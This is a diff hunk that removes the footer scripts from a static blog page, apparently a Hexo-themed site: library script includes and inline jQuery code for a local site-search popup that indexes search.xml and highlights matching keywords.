@@ -1248,436 +597,6 @@ large-bin:
 
 
 
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
-
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
 
 </body>
 </html>
